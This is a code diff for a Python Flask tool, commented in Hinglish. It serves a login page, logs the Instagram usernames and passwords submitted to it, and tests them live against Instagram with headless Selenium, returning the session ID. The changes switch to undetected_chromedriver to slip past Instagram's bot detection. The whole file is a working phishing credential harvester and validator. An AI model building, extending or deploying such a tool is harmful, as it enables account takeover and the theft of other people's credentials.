@@ -1,33 +1,27 @@
 import os
-import requests
+import time
 from flask import Flask, request, render_template, jsonify
 from selenium import webdriver
 from selenium.webdriver.common.by import By
-from selenium.webdriver.chrome.service import Service
-from webdriver_manager.chrome import ChromeDriverManager
 from selenium.webdriver.chrome.options import Options
-import time
+# Ye line add karo
+import undetected_chromedriver as uc
 
 app = Flask(__name__)
 
-# --- Instagram Login Checker Function (MODIFIED) ---
+# --- Instagram Login Checker Function (UNIVERSAL & PORTABLE) ---
 def check_instagram_login(username, password):
-    """
-    Yeh function Selenium use karke real Instagram pe login karta hai aur check karta hai ki credentials sahi hain ya nahi.
-    """
     chrome_options = Options()
     chrome_options.add_argument("--headless")  # Browser ko hide rakhega
     chrome_options.add_argument("--no-sandbox")
     chrome_options.add_argument("--disable-dev-shm-usage")
-    chrome_options.add_argument("--log-level=3")  # Logs ko kam karega
-    chrome_options.add_argument("--disable-blink-features=AutomationControlled") # Ye line add karo
-    chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"]) # Ye bhi add karo
-    chrome_options.add_experimental_option('useAutomationExtension', False) # Aur ye bhi
+    chrome_options.add_argument("--log-level=3") # Logs ko kam karega
+    chrome_options.add_argument("--window-size=1920,1080") # Window size set karo
 
-    # Driver ko initialize karna
+    # Driver ko initialize karna - YEH LINE MEIN BADLAV HAI
     try:
-        driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=chrome_options)
-        driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})") # Ye line add karo
+        # 'uc' use kar rahe hain, jo undetected-chromedriver hai
+        driver = uc.Chrome(options=chrome_options)
     except Exception as e:
         print(f"Error initializing WebDriver: {e}")
         return {"status": 0, "session_id": None, "error": "WebDriver setup failed."}
@@ -37,7 +31,7 @@ def check_instagram_login(username, password):
 
     try:
         # Username aur password field dhundhna
-        time.sleep(5) # Thoda aur wait karo, pehle 3 tha ab 5 kar do
+        time.sleep(5) # Page load hone ka wait
         username_field = driver.find_element(By.NAME, 'username')
         password_field = driver.find_element(By.NAME, 'password')
         username_field.send_keys(username)
@@ -45,24 +39,22 @@ def check_instagram_login(username, password):
         password_field.submit()
 
         # Login hone ka wait karna
-        time.sleep(7) # Network speed ke hisab se badha sakte ho, pehle 5 tha ab 7 kar do
+        time.sleep(7)
 
-        # --- YEH HAI MAIN CHANGE ---
-        # Ab hum check karenge ki login successful hai ya nahi
-        # Hum check karenge ki "Not Now" button ya profile icon load hua ya nahi
+        # Check karna ki login successful hai ya nahi
         is_logged_in = False
         try:
-            # Pehle "Not Now" button dhundo jo notifications ke liye aata hai
+            # Pehle "Not Now" button dhundo
             driver.find_element(By.XPATH, "//button[text()='Not Now']")
             is_logged_in = True
         except:
-            # Agar "Not Now" nahi mila, to home feed ka icon dhondo
             try:
+                # Home icon dhondo
                 driver.find_element(By.XPATH, "//*[local-name()='svg' and @aria-label='Home']")
                 is_logged_in = True
             except:
-                # Agar woh bhi nahi mila, to profile picture ke element dhondo
                 try:
+                    # Profile picture dhondo
                     driver.find_element(By.XPATH, "//img[@data-testid='user-avatar']")
                     is_logged_in = True
                 except:
@@ -81,37 +73,29 @@ def check_instagram_login(username, password):
             return {"status": 1, "session_id": session_id, "error": None}
         else:
             # Login failed
-            error_message = "Invalid credentials." # Default message
+            error_message = "Invalid credentials or blocked by Instagram."
             try:
-                # Galat password hone par error message dhundhne ki koshish karo
                 error_element = driver.find_element(By.ID, 'slfErrorAlert')
                 if error_element:
                     error_message = error_element.text
             except:
-                # Agar element nahi mila to bhi chalenge, default message rahega
                 pass
             driver.quit()
             return {"status": 0, "session_id": None, "error": error_message}
 
     except Exception as e:
-        driver.quit()  # Agar koi unexpected error aaye
+        driver.quit()
         return {"status": 0, "session_id": None, "error": f"An error occurred: {e}"}
 
-# Flask Routes (Previous Part)
-
+# Flask Routes
 @app.route('/')
 def index():
-    """
-    Yeh route tumhe local host par login page dikhayega.
-    """
+    """ Yeh route tumhe local host par login page dikhayega. """
     return render_template('login.html')
 
 @app.route('/check', methods=['POST'])
 def check_credentials():
-    """
-    Yeh route form se data lega, terminal par print karega,
-    aur phir check_instagram_login function ko call karega.
-    """
+    """ Yeh route form se data lega, terminal par print karega, aur phir check_instagram_login function ko call karega. """
     username = request.form.get('username')
     password = request.form.get('password')
 
@@ -141,12 +125,10 @@ def check_credentials():
     print("="*30 + "\n")
 
     # --- Step 4: User ko response bhejna (optional) ---
-    # Yeh user ko ek simple response page dega, jaan boojh kar confuse na ho.
     if result['status'] == 1:
         response_message = "Login successful! Check your terminal for details."
     else:
         response_message = "Login failed. The username or password you entered is incorrect."
-
     return jsonify({
         "message": response_message,
         "status": result['status']
@@ -154,9 +136,6 @@ def check_credentials():
 
 # --- Main block to run the server ---
 if __name__ == '__main__':
-    # Server ko start karna
-    # '0.0.0.0' ka matlab hai ki ye local network se accessible hoga
-    # port 5000 par run karenge
     print("Tool starting...")
     print("Open http://127.0.0.1:5000 in your browser to create the login page.")
     app.run(host='0.0.0.0', port=5000, debug=True)
